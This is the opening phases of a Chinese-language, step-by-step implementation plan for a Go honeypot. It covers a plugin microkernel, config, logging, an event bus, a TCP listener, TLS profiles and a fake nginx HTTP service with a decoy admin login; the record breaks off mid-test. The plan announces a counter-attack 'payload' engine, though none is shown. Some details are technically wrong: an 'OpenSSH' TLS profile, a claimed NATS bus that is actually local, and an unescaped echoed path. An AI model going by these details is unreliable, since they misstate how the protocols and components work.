# Laji-HoneyPot 实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建高性能溯源型蜜罐系统——微内核 + 蜜罐仿真 + 溯源反制 + 运维引擎 + Web管理面板

**Architecture:** Go 微内核插件架构，嵌入式 NATS 事件总线串联四大引擎（蜜罐/溯源/反制/运维），React 前端管理面板

**Tech Stack:** Go 1.22+, React 18+TypeScript+Vite, NATS embedded, Docker SDK, gVisor, zap logger, SQLite/PostgreSQL

---

## Phase 1: 项目骨架与微内核

### Task 1: 初始化 Go 模块与项目目录

**Files:**
- Create: `go.mod`
- Create: `cmd/honeypot/main.go`
- Create: `.gitignore`
- Create: `.golangci.yml`

- [ ] **Step 1: 初始化 Go module**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go mod init github.com/Laji-HoneyPot/honeypot
```

- [ ] **Step 2: 创建 .gitignore**

```gitignore
# Binaries
/honeypot
/honeypot-*
*.exe
*.dll
*.so
*.dylib

# Test binary
*.test

# Output of go coverage
*.out

# IDE
.idea/
.vscode/
*.swp
*.swo

# OS
.DS_Store
Thumbs.db

# Dependencies
vendor/

# Build
dist/
build/

# Config
*.local.yaml

# Data
data/
```

- [ ] **Step 3: 创建 .golangci.yml**

```yaml
linters:
  enable:
    - gofmt
    - govet
    - errcheck
    - staticcheck
    - gosimple
    - ineffassign
    - unused
    - misspell

run:
  timeout: 5m
  go: "1.22"

issues:
  exclude-use-default: false
  max-issues-per-linter: 0
  max-same-issues: 0
```

- [ ] **Step 4: 创建主入口 cmd/honeypot/main.go**

```go
package main

import (
	"fmt"
	"os"

	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

func main() {
	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to load config: %v\n", err)
		os.Exit(1)
	}

	logger := log.New(cfg.LogLevel)
	logger.Info("Laji-HoneyPot starting", "version", "0.1.0")

	// TODO: init registry, load plugins, start API server
	logger.Info("Laji-HoneyPot stopped")
}
```

- [ ] **Step 5: 创建所有内部目录结构**

```bash
mkdir -p internal/core/{registry,bus,config,log}
mkdir -p internal/plugin
mkdir -p internal/honeypot/{manager,tcpstack,tls,services/{http,mysql,redis,ssh}}
mkdir -p internal/traceability/{vulndb,fingerprint,payload,analysis}
mkdir -p internal/ops/{github,research}
mkdir -p pkg/{container,protocol}
mkdir -p web
mkdir -p deployments
mkdir -p scripts
```

- [ ] **Step 6: 安装初始依赖并验证编译**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go mod tidy
go build ./cmd/honeypot/
```

Expected: 编译成功，无错误。

---

### Task 2: 插件接口契约

**Files:**
- Create: `internal/plugin/plugin.go`
- Create: `internal/plugin/plugin_test.go`

- [ ] **Step 1: 创建插件接口定义**

`internal/plugin/plugin.go`:

```go
package plugin

import "github.com/Laji-HoneyPot/honeypot/internal/core/config"

// Plugin 是所有蜜罐插件的统一接口契约。
// 任何功能模块（蜜罐引擎、溯源引擎、反制引擎、运维引擎）都必须实现此接口。
type Plugin interface {
	// Name 返回插件唯一标识，如 "honeypot-http", "traceability-vulndb"
	Name() string
	// Version 返回语义化版本号
	Version() string
	// Init 初始化插件，接收配置切片
	Init(cfg config.Section) error
	// Start 启动插件，不应阻塞
	Start() error
	// Stop 优雅停止插件
	Stop() error
}

// Base 提供默认空实现，插件可嵌入以减少样板代码
type Base struct{}

func (Base) Init(cfg config.Section) error { return nil }
func (Base) Start() error                  { return nil }
func (Base) Stop() error                   { return nil }
```

- [ ] **Step 2: 创建接口测试（确保 Base 实现了 Plugin）**

`internal/plugin/plugin_test.go`:

```go
package plugin

import (
	"testing"
)

type testPlugin struct {
	Base
}

func (t testPlugin) Name() string    { return "test" }
func (t testPlugin) Version() string { return "0.1.0" }

func TestBaseImplementsPlugin(t *testing.T) {
	var p Plugin = &testPlugin{}
	if p.Name() != "test" {
		t.Errorf("expected 'test', got '%s'", p.Name())
	}
	if p.Version() != "0.1.0" {
		t.Errorf("expected '0.1.0', got '%s'", p.Version())
	}
}
```

- [ ] **Step 3: 运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./internal/plugin/ -v
```

Expected: PASS

---

### Task 3: 配置中心

**Files:**
- Create: `internal/core/config/config.go`
- Create: `internal/core/config/config_test.go`

- [ ] **Step 1: 创建配置结构体与加载逻辑**

`internal/core/config/config.go`:

```go
package config

import (
	"os"
	"strconv"

	"gopkg.in/yaml.v3"
)

// Config 顶层配置结构
type Config struct {
	LogLevel  string             `yaml:"log_level"`
	Plugins   map[string]Section `yaml:"plugins"`
	APIAddr   string             `yaml:"api_addr"`
	DataDir   string             `yaml:"data_dir"`
}

// Section 插件级配置，支持任意键值对
type Section map[string]any

// Load 从默认路径加载配置。YAML 文件 + 环境变量覆盖。
func Load(paths ...string) (*Config, error) {
	cfg := &Config{
		LogLevel: "info",
		APIAddr:  ":8080",
		DataDir:  "./data",
		Plugins:  make(map[string]Section),
	}

	p := "config.yaml"
	if len(paths) > 0 {
		p = paths[0]
	}

	data, err := os.ReadFile(p)
	if err != nil {
		if os.IsNotExist(err) {
			return cfg, nil // 无配置文件时使用默认值
		}
		return nil, err
	}

	if err := yaml.Unmarshal(data, cfg); err != nil {
		return nil, err
	}

	applyEnvOverrides(cfg)
	return cfg, nil
}

func applyEnvOverrides(cfg *Config) {
	if v := os.Getenv("HP_LOG_LEVEL"); v != "" {
		cfg.LogLevel = v
	}
	if v := os.Getenv("HP_API_ADDR"); v != "" {
		cfg.APIAddr = v
	}
	if v := os.Getenv("HP_DATA_DIR"); v != "" {
		cfg.DataDir = v
	}
}

// Get 从 Section 中安全获取字符串值
func (s Section) Get(key string) string {
	v, ok := s[key]
	if !ok {
		return ""
	}
	switch val := v.(type) {
	case string:
		return val
	case int:
		return strconv.Itoa(val)
	case bool:
		return strconv.FormatBool(val)
	default:
		return ""
	}
}

// GetInt 从 Section 中安全获取 int 值
func (s Section) GetInt(key string) int {
	v, ok := s[key]
	if !ok {
		return 0
	}
	switch val := v.(type) {
	case int:
		return val
	case float64:
		return int(val)
	case string:
		n, _ := strconv.Atoi(val)
		return n
	default:
		return 0
	}
}
```

- [ ] **Step 2: 创建配置测试**

`internal/core/config/config_test.go`:

```go
package config

import (
	"os"
	"testing"
)

func TestLoadDefaultConfig(t *testing.T) {
	cfg, err := Load("nonexistent.yaml")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.LogLevel != "info" {
		t.Errorf("expected 'info', got '%s'", cfg.LogLevel)
	}
	if cfg.APIAddr != ":8080" {
		t.Errorf("expected ':8080', got '%s'", cfg.APIAddr)
	}
}

func TestLoadWithEnvOverride(t *testing.T) {
	os.Setenv("HP_LOG_LEVEL", "debug")
	defer os.Unsetenv("HP_LOG_LEVEL")

	cfg, err := Load("nonexistent.yaml")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.LogLevel != "debug" {
		t.Errorf("expected 'debug', got '%s'", cfg.LogLevel)
	}
}

func TestSectionGet(t *testing.T) {
	s := Section{"port": 3306, "host": "localhost"}
	if s.Get("host") != "localhost" {
		t.Errorf("expected 'localhost', got '%s'", s.Get("host"))
	}
	if s.GetInt("port") != 3306 {
		t.Errorf("expected 3306, got %d", s.GetInt("port"))
	}
	if s.Get("missing") != "" {
		t.Errorf("expected '', got '%s'", s.Get("missing"))
	}
}
```

- [ ] **Step 3: 添加依赖并运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go get gopkg.in/yaml.v3
go test ./internal/core/config/ -v
```

Expected: PASS

- [ ] **Step 4: 创建默认配置文件**

`config.yaml`:

```yaml
log_level: info
api_addr: ":8080"
data_dir: "./data"

plugins:
  honeypot-http:
    enabled: true
    bind: "0.0.0.0"
    port: 8081
    tls_fingerprint: "nginx-1.24"
  honeypot-mysql:
    enabled: true
    bind: "0.0.0.0"
    port: 3306
    version: "8.0.35"
  honeypot-redis:
    enabled: true
    bind: "0.0.0.0"
    port: 6379
    version: "6.2"
  honeypot-ssh:
    enabled: true
    bind: "0.0.0.0"
    port: 2222
    fingerprint: "openssh-9.3"
  traceability-vulndb:
    enabled: true
    update_interval: "24h"
  countermeasure-payload:
    enabled: true
```

---

### Task 4: 日志系统

**Files:**
- Create: `internal/core/log/log.go`
- Create: `internal/core/log/log_test.go`

- [ ] **Step 1: 创建日志封装**

`internal/core/log/log.go`:

```go
package log

import (
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
)

// Logger 封装 zap 的结构化日志
type Logger struct {
	*zap.SugaredLogger
}

// New 根据日志等级创建 Logger
func New(level string) *Logger {
	var lvl zapcore.Level
	switch level {
	case "debug":
		lvl = zapcore.DebugLevel
	case "warn":
		lvl = zapcore.WarnLevel
	case "error":
		lvl = zapcore.ErrorLevel
	default:
		lvl = zapcore.InfoLevel
	}

	cfg := zap.NewProductionConfig()
	cfg.Level = zap.NewAtomicLevelAt(lvl)
	cfg.EncoderConfig.TimeKey = "timestamp"
	cfg.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder

	logger, err := cfg.Build()
	if err != nil {
		panic("failed to build logger: " + err.Error())
	}

	return &Logger{logger.Sugar()}
}
```

- [ ] **Step 2: 创建日志测试**

`internal/core/log/log_test.go`:

```go
package log

import (
	"testing"
)

func TestNewLogger(t *testing.T) {
	logger := New("debug")
	if logger == nil {
		t.Fatal("expected non-nil logger")
	}
	logger.Info("test log message")
	logger.Debugw("debug message", "key", "value")
}

func TestNewLoggerDefaultLevel(t *testing.T) {
	logger := New("unknown")
	if logger == nil {
		t.Fatal("expected non-nil logger")
	}
	logger.Info("this should be info level")
}
```

- [ ] **Step 3: 安装依赖并运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go get go.uber.org/zap
go test ./internal/core/log/ -v
```

Expected: PASS

---

### Task 5: 事件总线

**Files:**
- Create: `internal/core/bus/bus.go`
- Create: `internal/core/bus/bus_test.go`

- [ ] **Step 1: 创建事件总线封装**

`internal/core/bus/bus.go`:

```go
package bus

import (
	"fmt"
	"sync"
)

// Event 表示一条事件
type Event struct {
	Topic   string
	Payload []byte
}

// Handler 事件处理函数
type Handler func(Event)

// Bus 事件总线，插件间异步通信。
// 采用本地 channel 实现，零外部依赖。
type Bus struct {
	mu       sync.RWMutex
	handlers map[string][]Handler
}

// New 创建事件总线
func New() *Bus {
	return &Bus{
		handlers: make(map[string][]Handler),
	}
}

// Subscribe 订阅主题
func (b *Bus) Subscribe(topic string, handler Handler) {
	b.mu.Lock()
	defer b.mu.Unlock()
	b.handlers[topic] = append(b.handlers[topic], handler)
}

// Publish 向主题发布事件（异步，非阻塞）
func (b *Bus) Publish(topic string, payload []byte) error {
	b.mu.RLock()
	handlers := b.handlers[topic]
	b.mu.RUnlock()

	if len(handlers) == 0 {
		return fmt.Errorf("no handlers for topic: %s", topic)
	}

	evt := Event{Topic: topic, Payload: payload}
	for _, h := range handlers {
		go h(evt) // 异步分发
	}
	return nil
}

// PublishSync 同步发布事件
func (b *Bus) PublishSync(topic string, payload []byte) error {
	b.mu.RLock()
	handlers := b.handlers[topic]
	b.mu.RUnlock()

	if len(handlers) == 0 {
		return fmt.Errorf("no handlers for topic: %s", topic)
	}

	evt := Event{Topic: topic, Payload: payload}
	for _, h := range handlers {
		h(evt)
	}
	return nil
}

// Topics 返回所有已注册主题
func (b *Bus) Topics() []string {
	b.mu.RLock()
	defer b.mu.RUnlock()
	topics := make([]string, 0, len(b.handlers))
	for t := range b.handlers {
		topics = append(topics, t)
	}
	return topics
}
```

- [ ] **Step 2: 创建事件总线测试**

`internal/core/bus/bus_test.go`:

```go
package bus

import (
	"sync"
	"testing"
	"time"
)

func TestPublishSubscribe(t *testing.T) {
	b := New()
	var mu sync.Mutex
	var received []string

	b.Subscribe("alert", func(e Event) {
		mu.Lock()
		received = append(received, string(e.Payload))
		mu.Unlock()
	})

	err := b.Publish("alert", []byte("intrusion detected"))
	if err != nil {
		t.Fatalf("publish failed: %v", err)
	}

	time.Sleep(50 * time.Millisecond) // 等待异步分发

	mu.Lock()
	defer mu.Unlock()
	if len(received) != 1 || received[0] != "intrusion detected" {
		t.Errorf("unexpected received: %v", received)
	}
}

func TestPublishNoHandler(t *testing.T) {
	b := New()
	err := b.Publish("nonexistent", []byte("data"))
	if err == nil {
		t.Error("expected error for topic with no handlers")
	}
}

func TestTopics(t *testing.T) {
	b := New()
	b.Subscribe("topic-a", func(e Event) {})
	b.Subscribe("topic-b", func(e Event) {})

	topics := b.Topics()
	if len(topics) != 2 {
		t.Errorf("expected 2 topics, got %d", len(topics))
	}
}
```

- [ ] **Step 3: 运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./internal/core/bus/ -v
```

Expected: PASS

---

### Task 6: 插件注册中心

**Files:**
- Create: `internal/core/registry/registry.go`
- Create: `internal/core/registry/registry_test.go`

- [ ] **Step 1: 创建注册中心**

`internal/core/registry/registry.go`:

```go
package registry

import (
	"fmt"
	"sync"

	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	"github.com/Laji-HoneyPot/honeypot/internal/plugin"
)

// Registry 插件注册中心，负责所有插件的生命周期管理
type Registry struct {
	mu      sync.Mutex
	plugins map[string]plugin.Plugin
	logger  *log.Logger
	cfg     *config.Config
}

// New 创建注册中心
func New(logger *log.Logger, cfg *config.Config) *Registry {
	return &Registry{
		plugins: make(map[string]plugin.Plugin),
		logger:  logger,
		cfg:     cfg,
	}
}

// Register 注册插件
func (r *Registry) Register(p plugin.Plugin) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	name := p.Name()
	if _, exists := r.plugins[name]; exists {
		return fmt.Errorf("plugin %s already registered", name)
	}
	r.plugins[name] = p
	r.logger.Infow("plugin registered", "name", name, "version", p.Version())
	return nil
}

// InitAll 初始化所有已注册插件
func (r *Registry) InitAll() error {
	r.mu.Lock()
	defer r.mu.Unlock()

	for name, p := range r.plugins {
		section, ok := r.cfg.Plugins[name]
		if !ok {
			section = config.Section{}
		}
		if err := p.Init(section); err != nil {
			return fmt.Errorf("init plugin %s: %w", name, err)
		}
		r.logger.Infow("plugin initialized", "name", name)
	}
	return nil
}

// StartAll 启动所有已注册插件
func (r *Registry) StartAll() error {
	r.mu.Lock()
	defer r.mu.Unlock()

	for name, p := range r.plugins {
		if err := p.Start(); err != nil {
			return fmt.Errorf("start plugin %s: %w", name, err)
		}
		r.logger.Infow("plugin started", "name", name)
	}
	return nil
}

// StopAll 停止所有插件
func (r *Registry) StopAll() {
	r.mu.Lock()
	defer r.mu.Unlock()

	for name, p := range r.plugins {
		if err := p.Stop(); err != nil {
			r.logger.Errorw("stop plugin failed", "name", name, "error", err)
		} else {
			r.logger.Infow("plugin stopped", "name", name)
		}
	}
}

// Get 按名称获取插件
func (r *Registry) Get(name string) (plugin.Plugin, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	p, ok := r.plugins[name]
	return p, ok
}

// List 列出所有插件名称
func (r *Registry) List() []string {
	r.mu.Lock()
	defer r.mu.Unlock()
	names := make([]string, 0, len(r.plugins))
	for name := range r.plugins {
		names = append(names, name)
	}
	return names
}
```

- [ ] **Step 2: 创建注册中心测试**

`internal/core/registry/registry_test.go`:

```go
package registry

import (
	"testing"

	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	"github.com/Laji-HoneyPot/honeypot/internal/plugin"
)

type mockPlugin struct {
	plugin.Base
	name    string
	version string
	inited  bool
	started bool
	stopped bool
}

func (m *mockPlugin) Name() string              { return m.name }
func (m *mockPlugin) Version() string           { return m.version }
func (m *mockPlugin) Init(cfg config.Section) error { m.inited = true; return nil }
func (m *mockPlugin) Start() error              { m.started = true; return nil }
func (m *mockPlugin) Stop() error               { m.stopped = true; return nil }

func TestRegisterAndLifecycle(t *testing.T) {
	logger := log.New("info")
	cfg := &config.Config{Plugins: map[string]config.Section{}}
	reg := New(logger, cfg)

	p1 := &mockPlugin{name: "test-a", version: "1.0"}
	p2 := &mockPlugin{name: "test-b", version: "2.0"}

	if err := reg.Register(p1); err != nil {
		t.Fatalf("register p1: %v", err)
	}
	if err := reg.Register(p2); err != nil {
		t.Fatalf("register p2: %v", err)
	}

	// 重复注册应报错
	if err := reg.Register(p1); err == nil {
		t.Error("expected error for duplicate registration")
	}

	if err := reg.InitAll(); err != nil {
		t.Fatalf("initall: %v", err)
	}
	if !p1.inited || !p2.inited {
		t.Error("expected all plugins to be inited")
	}

	if err := reg.StartAll(); err != nil {
		t.Fatalf("startall: %v", err)
	}
	if !p1.started || !p2.started {
		t.Error("expected all plugins to be started")
	}

	reg.StopAll()
	if !p1.stopped || !p2.stopped {
		t.Error("expected all plugins to be stopped")
	}

	names := reg.List()
	if len(names) != 2 {
		t.Errorf("expected 2 plugins, got %d", len(names))
	}
}
```

- [ ] **Step 3: 运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./internal/core/registry/ -v
```

Expected: PASS

---

### Task 7: 微内核集成 — 更新主入口

**Files:**
- Modify: `cmd/honeypot/main.go`

- [ ] **Step 1: 重写 main.go，集成所有核心组件**

```go
package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"

	"github.com/Laji-HoneyPot/honeypot/internal/core/config"
	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
	"github.com/Laji-HoneyPot/honeypot/internal/core/registry"
)

func main() {
	cfg, err := config.Load()
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to load config: %v\n", err)
		os.Exit(1)
	}

	logger := log.New(cfg.LogLevel)
	logger.Info("Laji-HoneyPot starting", "version", "0.1.0")

	reg := registry.New(logger, cfg)

	// TODO: register plugins here as they are built

	if err := reg.InitAll(); err != nil {
		logger.Errorw("failed to init plugins", "error", err)
		os.Exit(1)
	}

	if err := reg.StartAll(); err != nil {
		logger.Errorw("failed to start plugins", "error", err)
		os.Exit(1)
	}

	logger.Info("Laji-HoneyPot running, press Ctrl+C to stop")

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	logger.Info("shutting down...")
	reg.StopAll()
	logger.Info("Laji-HoneyPot stopped")
}
```

- [ ] **Step 2: 完整编译验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go build -o honeypot ./cmd/honeypot/
./honeypot &
sleep 1
kill %1
```

Expected: 正常启动、正常退出。

---

## Phase 2: 蜜罐引擎（子系统 A）

### Task 8: TCP 协议栈基础

**Files:**
- Create: `internal/honeypot/tcpstack/stack.go`
- Create: `internal/honeypot/tcpstack/stack_test.go`

- [ ] **Step 1: 创建 TCP 协议栈抽象**

`internal/honeypot/tcpstack/stack.go`:

```go
package tcpstack

import (
	"fmt"
	"net"
	"sync"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// ConnHandler 处理新进 TCP 连接的回调
type ConnHandler func(conn net.Conn)

// Stack 自研 TCP 协议栈抽象层。
// 封装原始 socket 监听，提供连接管理、TLS 指纹伪装注入点。
type Stack struct {
	mu       sync.Mutex
	logger   *log.Logger
	handlers map[int]ConnHandler
	listeners map[int]net.Listener
}

// New 创建 TCP 协议栈
func New(logger *log.Logger) *Stack {
	return &Stack{
		logger:    logger,
		handlers:  make(map[int]ConnHandler),
		listeners: make(map[int]net.Listener),
	}
}

// Listen 在指定端口开始监听，连接到达时回调 handler
func (s *Stack) Listen(port int, handler ConnHandler) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	if _, exists := s.listeners[port]; exists {
		return fmt.Errorf("port %d already listening", port)
	}

	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return fmt.Errorf("listen on port %d: %w", port, err)
	}

	s.handlers[port] = handler
	s.listeners[port] = ln
	s.logger.Infow("tcp stack listening", "port", port)

	go s.acceptLoop(port, ln)
	return nil
}

func (s *Stack) acceptLoop(port int, ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			s.logger.Debugw("accept closed", "port", port, "error", err)
			return
		}
		s.mu.Lock()
		handler := s.handlers[port]
		s.mu.Unlock()
		if handler != nil {
			go handler(conn)
		}
	}
}

// Close 关闭指定端口监听
func (s *Stack) Close(port int) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	ln, ok := s.listeners[port]
	if !ok {
		return fmt.Errorf("port %d not listening", port)
	}
	delete(s.listeners, port)
	delete(s.handlers, port)
	return ln.Close()
}

// CloseAll 关闭所有监听
func (s *Stack) CloseAll() {
	s.mu.Lock()
	defer s.mu.Unlock()
	for port, ln := range s.listeners {
		ln.Close()
		delete(s.listeners, port)
		delete(s.handlers, port)
		s.logger.Debugw("tcp stack closed", "port", port)
	}
}
```

- [ ] **Step 2: 创建 TCP 协议栈测试**

`internal/honeypot/tcpstack/stack_test.go`:

```go
package tcpstack

import (
	"net"
	"testing"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

func TestListenAndConnect(t *testing.T) {
	logger := log.New("debug")
	stack := New(logger)

	done := make(chan struct{})
	stack.Listen(19999, func(conn net.Conn) {
		defer conn.Close()
		buf := make([]byte, 1024)
		n, _ := conn.Read(buf)
		conn.Write([]byte("echo:" + string(buf[:n])))
		close(done)
	})
	defer stack.CloseAll()

	time.Sleep(50 * time.Millisecond)

	conn, err := net.Dial("tcp", "127.0.0.1:19999")
	if err != nil {
		t.Fatalf("dial failed: %v", err)
	}
	defer conn.Close()

	conn.Write([]byte("hello"))
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		t.Fatalf("read failed: %v", err)
	}
	resp := string(buf[:n])
	if resp != "echo:hello" {
		t.Errorf("expected 'echo:hello', got '%s'", resp)
	}

	select {
	case <-done:
	case <-time.After(time.Second):
		t.Error("handler not called within timeout")
	}
}

func TestDuplicateListen(t *testing.T) {
	logger := log.New("info")
	stack := New(logger)

	stack.Listen(19998, func(conn net.Conn) { conn.Close() })
	defer stack.CloseAll()

	time.Sleep(30 * time.Millisecond)

	err := stack.Listen(19998, func(conn net.Conn) { conn.Close() })
	if err == nil {
		t.Error("expected error for duplicate listen")
	}
}
```

- [ ] **Step 3: 运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./internal/honeypot/tcpstack/ -v
```

Expected: PASS

---

### Task 9: TLS 指纹伪装模块

**Files:**
- Create: `internal/honeypot/tls/fingerprint.go`
- Create: `internal/honeypot/tls/fingerprint_test.go`

- [ ] **Step 1: 创建 TLS 指纹伪装**

`internal/honeypot/tls/fingerprint.go`:

```go
package tls

import "crypto/tls"

// Fingerprint 定义 TLS 指纹特征
type Fingerprint struct {
	MinVersion uint16
	MaxVersion uint16
	CipherSuites []uint16
}

// 预定义常见服务 TLS 指纹
var (
	Nginx124 = Fingerprint{
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		},
	}

	Apache2437 = Fingerprint{
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
	}

	OpenSSH93 = Fingerprint{
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_128_GCM_SHA256,
		},
	}
)

// Profile 根据指纹预定义的名称查找
var Profile = map[string]Fingerprint{
	"nginx-1.24":    Nginx124,
	"apache-2.4.37": Apache2437,
	"openssh-9.3":   OpenSSH93,
}

// Apply 将指纹应用到 TLS config
func Apply(f Fingerprint) *tls.Config {
	return &tls.Config{
		MinVersion:   f.MinVersion,
		MaxVersion:   f.MaxVersion,
		CipherSuites: f.CipherSuites,
	}
}
```

- [ ] **Step 2: 创建 TLS 指纹测试**

`internal/honeypot/tls/fingerprint_test.go`:

```go
package tls

import (
	"crypto/tls"
	"testing"
)

func TestPredefinedProfiles(t *testing.T) {
	profiles := []string{"nginx-1.24", "apache-2.4.37", "openssh-9.3"}
	for _, name := range profiles {
		fp, ok := Profile[name]
		if !ok {
			t.Errorf("profile %s not found", name)
			continue
		}
		cfg := Apply(fp)
		if cfg.MinVersion == 0 {
			t.Errorf("profile %s: MinVersion not set", name)
		}
		if len(cfg.CipherSuites) == 0 {
			t.Errorf("profile %s: CipherSuites empty", name)
		}
	}
}

func TestNginxConfig(t *testing.T) {
	fp := Profile["nginx-1.24"]
	cfg := Apply(fp)
	if cfg.MinVersion != tls.VersionTLS12 {
		t.Errorf("expected TLS 1.2 min, got %d", cfg.MinVersion)
	}
	if cfg.MaxVersion != tls.VersionTLS13 {
		t.Errorf("expected TLS 1.3 max, got %d", cfg.MaxVersion)
	}
}
```

- [ ] **Step 3: 运行测试**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./internal/honeypot/tls/ -v
```

Expected: PASS

---

### Task 10: HTTP 蜜罐服务

**Files:**
- Create: `internal/honeypot/services/http/server.go`
- Create: `internal/honeypot/services/http/server_test.go`

- [ ] **Step 1: 创建 HTTP 蜜罐服务**

`internal/honeypot/services/http/server.go`:

```go
package http

import (
	"bufio"
	"fmt"
	"net"
	"net/textproto"
	"strings"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

// Server 模拟 HTTP 服务（nginx 指纹）
type Server struct {
	logger *log.Logger
}

// New 创建 HTTP 蜜罐
func New(logger *log.Logger) *Server {
	return &Server{logger: logger}
}

// Handle 处理一个 TCP 连接，模拟 HTTP 交互
func (s *Server) Handle(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))
	reader := bufio.NewReader(conn)
	tp := textproto.NewReader(reader)

	for {
		line, err := tp.ReadLine()
		if err != nil {
			return
		}

		parts := strings.Fields(line)
		if len(parts) < 2 {
			return
		}
		method, path := parts[0], parts[1]

		headers, err := tp.ReadMIMEHeader()
		if err != nil {
			return
		}

		s.logger.Infow("http request",
			"remote", conn.RemoteAddr().String(),
			"method", method,
			"path", path,
			"user-agent", headers.Get("User-Agent"),
		)

		resp := s.buildResponse(path, headers)
		conn.Write([]byte(resp))
	}
}

func (s *Server) buildResponse(path string, headers textproto.MIMEHeader) string {
	status := 200
	statusText := "OK"
	body := s.renderPage(path)

	if strings.Contains(path, "admin") || strings.Contains(path, "login") {
		status = 200
		body = s.loginPage()
	} else if strings.Contains(path, ".php") || strings.Contains(path, "wp-") {
		// 模拟 WordPress
		status = 404
		statusText = "Not Found"
		body = s.errorPage(404)
	}

	return fmt.Sprintf(
		"HTTP/1.1 %d %s\r\n"+
			"Server: nginx/1.24.0\r\n"+
			"Content-Type: text/html; charset=utf-8\r\n"+
			"Content-Length: %d\r\n"+
			"Connection: keep-alive\r\n"+
			"X-Powered-By: PHP/8.1\r\n"+
			"\r\n"+
			"%s",
		status, statusText, len(body), body,
	)
}

func (s *Server) renderPage(path string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body>
<h1>Welcome to Nginx</h1>
<p>Path: %s</p>
</body>
</html>`, path)
}

func (s *Server) loginPage() string {
	return `<!DOCTYPE html>
<html>
<head><title>Admin Login</title></head>
<body>
<h1>Administrator Login</h1>
<form method="POST" action="/admin/login">
  <input type="text" name="username" placeholder="Username" />
  <input type="password" name="password" placeholder="Password" />
  <button type="submit">Login</button>
</form>
</body>
</html>`
}

func (s *Server) errorPage(code int) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>%d Not Found</title></head>
<body><h1>%d Not Found</h1></body>
</html>`, code, code)
}
```

- [ ] **Step 2: 创建 HTTP 蜜罐测试**

`internal/honeypot/services/http/server_test.go`:

```go
package http

import (
	"io"
	"net"
	"net/http"
	"testing"
	"time"

	"github.com/Laji-HoneyPot/honeypot/internal/core/log"
)

func TestHTTPHoneypot(t *testing.T) {
	logger := log.New("debug")
	srv := New(logger)

	ln, err := net.Listen("tcp", "127.0.0.1:18999")
	if err != nil {
		t.Fatalf("listen failed: %v", err)
	}
	defer ln.Close()

	go func() {
		conn, _ := ln.Accept()
		srv.Handle(conn)
	}()

	time.Sleep(30 * time.Millisecond)

	resp, err := http.Get("http://127.0.0.1:18999/")
	if err != nil {
		t.Fatalf("http get failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		t.Errorf("expected 200, got %d", resp.StatusCode)
	}
	if resp.Header.Get("Server") != "nginx/1.24.0" {
		t.Errorf("expected nginx server header, got %s", resp.Header.Get("Server"))
	}
	if !contains(string(body), "Welcome to Nginx") {
		t.Errorf("unexpected body: %s", string(body))
	}
}

func TestAdminLoginPage(t *testing.T) {
	logger := log.New("debug")
	srv := New(logger)

	ln, err := net.Listen("tcp", "127.0.0.1:18998")
	if err != nil {
		t.Fatalf("listen failed: %v", err)
	}
	defer ln.Close()

	go func() {
		conn, _ := ln.Accept()
